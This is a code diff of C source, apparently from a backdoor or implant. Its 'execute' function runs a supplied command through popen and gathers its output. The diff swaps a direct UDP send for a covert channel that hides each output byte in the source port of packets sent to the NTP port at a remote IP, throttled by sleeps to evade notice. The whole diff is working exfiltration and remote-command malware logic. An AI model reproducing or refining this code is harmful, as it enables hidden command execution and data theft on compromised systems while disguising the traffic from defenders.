@@ -130,8 +130,6 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 	FILE *fp;
 	char line[MAX_LEN];
 	char resp[MAX_LEN];
-	int sock = 0;
-	struct sockaddr_in saddr;
 	int tot_len;
 
 	memset(line, 0, MAX_LEN);
@@ -139,19 +137,6 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 
 	// Run the command, grab stdout
 	fp = popen(command, "r");
-
-	// Prep for network comm
-	if (duplex)
-	{
-		bzero(&saddr, sizeof(saddr));
-		saddr.sin_family = AF_INET;
-		saddr.sin_addr.s_addr = ip;
-		saddr.sin_port = port;
-
-		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-		if (sock < 0)
-			perror("socket");
-	}
 
 	// Append line by line output into response buffer
 	while (fgets(line, MAX_LEN, fp) != NULL)
@@ -171,8 +156,8 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 			char *enc;
 			char *ptr;
 			int fram_len;
-			ushort src_port;
-			ushort dst_port;
+			uint16 src_port = 0;
+			uint16 dst_port = 0;
 
 			ptr = trans + i;
 
@@ -182,15 +167,20 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 
 //			enc = encrypt(SEKRET, frame, FRAM_SZ);
 
-//			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
-			src_port = (frame[0] << 8) + frame[i];
-			dst_port = 9001;
-
-			_sendUDP(ip, src_port, dst_port);
-			
-			usleep(SLEEP_TIME);
+//			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
 //			free(enc);
+
+			for (int j = 0; j < FRAM_SZ; ++j)
+			{
+				uint8 byte = frame[j];
+				src_port = 0xFF00 & SIGNTR << 8;
+				src_port += byte;
+				dst_port = PORT_NTP;
+
+				_sendUDP(ip, src_port, dst_port);
+				usleep(SLEEP_TIME);
+			}
 		}
 
 		free(trans);
